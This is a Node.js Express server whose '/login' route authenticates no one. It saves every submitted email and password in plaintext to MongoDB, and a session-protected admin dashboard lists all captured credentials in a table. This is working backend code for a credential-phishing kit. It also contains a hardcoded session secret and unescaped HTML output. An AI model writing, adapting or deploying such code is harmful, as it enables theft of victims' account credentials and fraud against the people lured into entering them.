require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const session = require('express-session');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({ secret: 'supersecretkey', resave: false, saveUninitialized: true }));

// ---- MongoDB ----
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log("MongoDB Connected"))
  .catch(err => console.error("MongoDB Connection Error:", err));

// ---- Schema ----
const User = mongoose.model('User', new mongoose.Schema({
    email: String,
    password: String,
    date: { type: Date, default: Date.now }
}));

// ---- Save user ----
app.post('/login', async (req, res) => {
    try {
        await User.create({ email: req.body.email, password: req.body.password });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false });
    }
});

// ---- Admin Login Page ----
app.get('/admin', (req, res) => {
    if (req.session.loggedIn) return res.redirect('/dashboard');
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

// ---- Handle Admin Login ----
app.post('/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
        req.session.loggedIn = true;
        res.redirect('/dashboard');
    } else {
        res.send("<h2>Wrong Username or Password</h2><a href='/admin'>Try Again</a>");
    }
});

// ---- Dashboard ----
app.get('/dashboard', async (req, res) => {
    if (!req.session.loggedIn) return res.redirect('/admin');
    const users = await User.find().sort({ date: -1 });
    let rows = users.map(u => `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`).join('');
    res.send(`<h1>Admin Panel</h1><a href='/logout'>Logout</a><table border="1" cellpadding="8"><tr><th>Email</th><th>Password</th><th>Date</th></tr>${rows}</table>`);
});

// ---- Logout ----
app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/admin'));
});

// ---- Start ----
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on " + PORT));
